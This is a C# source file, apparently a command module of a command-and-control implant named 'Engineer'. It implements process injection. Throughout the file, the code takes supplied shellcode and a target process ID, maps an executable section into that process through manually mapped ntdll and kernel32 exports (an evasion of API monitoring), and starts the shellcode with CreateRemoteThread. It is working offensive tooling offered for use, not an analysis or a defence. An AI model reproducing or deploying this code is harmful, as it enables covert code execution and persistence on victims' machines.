using Engineer.Commands;
using Engineer.Extra;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using static Engineer.Extra.h_reprobate.Win32;

namespace Engineer.Commands
{
    internal class Inject : EngineerCommand
    {
        public override string Name => "inject";
        private static h_reprobate.PE.PE_MANUAL_MAP ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
        public override async Task Execute(EngineerTask task)
        {
            try 
            {
                if (task.File.Length < 1)
                {
                    Tasking.FillTaskResults("No shellcode provided",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                //convert from base64 string to byte array
                byte[] shellcode = task.File;

                if (!task.Arguments.TryGetValue("/pid", out string pid))
                {
                    Tasking.FillTaskResults("No pid provided",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                int pidInt = int.Parse(pid.TrimStart(' '));
                var processToInject = Process.GetProcessById(pidInt);

                IntPtr processPointer = WinAPIs.Kernel32.OpenProcess(WinAPIs.Kernel32.ProcessAllFlags, false, pidInt);
                if (MapViewLoadShellcode(shellcode, processPointer))
                {
                    Tasking.FillTaskResults("process injected",task,EngTaskStatus.Complete,TaskResponseType.String);
                    return;
                }
                Tasking.FillTaskResults("Failed to inject, if owned by another user make sure current process is in high integrity or has seDebug privs",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            }
            catch(Exception e)
            {
                Tasking.FillTaskResults(e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }


        public static bool MapViewLoadShellcode(byte[] shellcode, IntPtr hProcess)
        {
            var ntdll = reprobate.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            // dinvoke nt create section
            // make object that holds the input parameters for the api
            var createSectionParameters = new object[] { hSection, (uint)0x10000000, IntPtr.Zero, maxSize, (uint)0x40, (uint)0x08000000, IntPtr.Zero };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtCreateSection", typeof(WinApiDynamicDelegate.NtCreateSection), createSectionParameters, false);
            hSection = (IntPtr)createSectionParameters[0];

            // dinvoke map view of section local
            IntPtr localBaseAddress = new IntPtr();
            ulong viewSize = new ulong();
            var mapViewParameters = new object[] { hSection, Process.GetCurrentProcess().Handle, localBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x04 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
            localBaseAddress = (IntPtr)mapViewParameters[2];

            // writeProcessMemory locally so we can map it to target after
            var numberOfBytes = new IntPtr();
            var writeProcessParameters = new object[] { Process.GetCurrentProcess().Handle, localBaseAddress, shellcode, (uint)shellcode.Length, numberOfBytes };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "WriteProcessMemory", typeof(WinApiDynamicDelegate.WriteProcessMemory), writeProcessParameters, false);
            numberOfBytes = (IntPtr)writeProcessParameters[4];
            //Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");

            // dinvoke map view of section remote which basically copies shellcode
            IntPtr remoteBaseAddress = new IntPtr();
            mapViewParameters = new object[] { hSection, hProcess, remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x20 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
            remoteBaseAddress = (IntPtr)mapViewParameters[2];
            //Console.WriteLine($"Mapped view to target");
            var createThreadResult = (WinAPIs.Kernel32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero);
            reprobate.FreeModule(ntdll);
            reprobate.FreeModule(ker32);
            if (createThreadResult)
            {
                return true;
            }
            return false;
        }
    }
}
